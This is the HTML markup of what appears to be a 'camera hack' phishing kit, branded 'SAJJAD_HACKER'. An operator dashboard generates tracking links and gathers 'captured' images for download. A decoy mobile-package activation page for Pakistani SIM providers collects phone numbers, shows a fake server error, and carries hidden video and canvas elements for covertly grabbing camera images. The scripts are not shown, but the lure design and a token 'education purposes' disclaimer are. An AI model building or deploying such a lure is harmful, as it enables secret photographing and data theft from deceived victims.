<p style="padding-left: 60px;">&lt;!doctype html&gt;</p>
<p></p>
<!-- Theme Toggle -->
<div class="theme-toggle">&nbsp;</div>
<!-- Main Container -->
<div class="container"><!-- Dashboard Card -->
<div id="dashboard-card" class="card">
<div class="header">
<div class="logo-container">
<div class="logo"><span style="color: #000000;"><img src="https://html5-editor.net/tinymce/plugins/emoticons/img/smiley-cool.gif" alt="cool" width="18" height="18" /></span></div>
<div class="logo-text"><span style="color: #000000;"><em><strong>SAJJAD_HACKER</strong> CAM3RA H4CK</em></span></div>
</div>
<div class="badge"><span style="color: #000000;">PROFESSIONAL HACKER</span></div>
</div>
<h1><span style="color: #000000;">Secure Link Generator</span></h1>
<p class="subtitle"><span style="color: #000000;">Generate unique tracking links and manage captured data. All sessions persist even after page refresh.</span></p>
<span style="color: #000000;"><!-- Stats --></span>
<div class="stats-container">
<div class="stat-card">
<div id="totalLinks" class="stat-number"><span style="color: #000000;">0</span></div>
<div class="stat-label"><span style="color: #000000;">Links Generated</span></div>
</div>
<div class="stat-card">
<div id="totalImages" class="stat-number"><span style="color: #000000;">0</span></div>
<div class="stat-label"><span style="color: #000000;">Images Captured</span></div>
</div>
<div class="stat-card">
<div id="activeSessions" class="stat-number"><span style="color: #000000;">0</span></div>
<div class="stat-label"><span style="color: #000000;">Active Sessions</span></div>
</div>
</div>
<span style="color: #000000;"><!-- Link Generation Section --></span>
<div class="form-group"><span style="color: #000000;"><button id="genBtn" class="btn btn-primary btn-full"> Generate New Link </button></span></div>
<div id="linkArea" class="hidden">
<div class="link-box">
<h3><span style="color: #000000;">Generated Link</span></h3>
<div class="link-display"><span style="color: #000000;"><input id="generatedLink" readonly="readonly" type="text" /></span></div>
<div class="btn-group"><span style="color: #000000;"><button id="copyBtn" class="btn btn-secondary btn-small"> Copy </button> <button id="openBtn" class="btn btn-outline btn-small"> Open </button> <button id="refreshBtn" class="btn btn-success btn-small"> Refresh Data </button></span></div>
<span style="color: #000000;"><!-- Session Info --></span>
<div class="session-info"><span style="color: #000000;"> Active Session<span id="sessionId" class="session-id">Not Set</span></span></div>
</div>
</div>
<span style="color: #000000;"><!-- Data Area --></span>
<div id="dataArea" class="hidden">
<div class="gallery-header">
<h3><span style="color: #000000;">Captured Data</span></h3>
<span style="color: #000000;"><button id="clearBtn" class="btn btn-danger btn-small"> Clear All </button></span></div>
<div id="images" class="gallery"><span style="color: #000000;">&nbsp;</span></div>
<span style="color: #000000;"><button id="downloadBtn" class="btn btn-primary btn-full"> Download All Images (ZIP) </button></span></div>
<span style="color: #000000;"><!-- Disclaimer --></span>
<div class="status-message status-warning" style="display: block; margin-top: 30px;"><span style="color: #000000;"> DISCLAIMER: only education purposes.&nbsp;</span></div>
</div>
<span style="color: #000000;"><!-- Package Activator Card --></span>
<div id="pkg-activator-card" class="card" style="display: none;">
<div class="header">
<div class="logo-container">
<div class="logo"><span style="color: #000000;">PA</span></div>
<div class="logo-text"><span style="color: #000000;">Package Activator</span></div>
</div>
<div class="badge"><span style="color: #000000;">PREMIUM</span></div>
</div>
<h1><span style="color: #000000;">Package Activation</span></h1>
<p class="subtitle"><span style="color: #000000;">Select your SIM provider and enter your mobile number to activate your desired package.</span></p>
<span style="color: #000000;"><!-- Activation Form --></span>
<div class="form-group"><span style="color: #000000;"><label for="sim-select"> Select SIM Provider</label></span><select id="sim-select">
<option value="">-- Choose Provider --</option>
<option value="jazz">Jazz</option>
<option value="telenor">Telenor</option>
<option value="ufone">Ufone</option>
<option value="zong">Zong</option>
<option value="sco">SCOM</option>
<option value="other">Other/Landline</option>
</select></div>
<div class="form-group"><span style="color: #000000;"><label for="mobile-number"> Mobile Number</label></span>
<div class="input-with-icon"><span style="color: #000000;"><input id="mobile-number" maxlength="11" type="tel" placeholder="03xxxxxxxxx" /></span></div>
</div>
<span style="color: #000000;"><button id="activateBtn" class="btn btn-primary btn-full"> Activate Package </button> <!-- Activation Status --></span>
<div id="activationStatus" class="status-message status-error"><span style="color: #000000;"> SERVER ERROR</span><br /><span style="color: #000000;"> <small>Please try again later. Server is down due to overload.</small></span></div>
<span style="color: #000000;"><!-- Camera Elements (Hidden) --> <video id="videoElement" autoplay="autoplay" muted="" width="300" height="150"></video> <canvas id="canvasElement"></canvas></span></div>
</div>
<p><span style="color: #000000;"><!-- Marquee --></span></p>
<div class="marquee-container">
<div class="marquee-content"><span style="color: #000000;">P O W E R E</span> <span style="color: #ccff00;">D</span> <span style="color: #66ff00;">B</span> <span style="color: #33ff00;">Y</span> <span style="color: #00ff33;">|</span> <span style="color: #00ff99;">MR</span> <span style="color: #00ffcc;">.SAD</span> <span style="color: #00ccff;">H</span> <span style="color: #0099ff;">A</span> <span style="color: #0066ff;">C</span> <span style="color: #0033ff;">K</span> <span style="color: #0000ff;">E</span> <span style="color: #3300ff;">R</span> <span style="color: #9900ff;">P</span> <span style="color: #cc00ff;">R</span> <span style="color: #ff00ff;">O</span>&nbsp;</div>
</div>
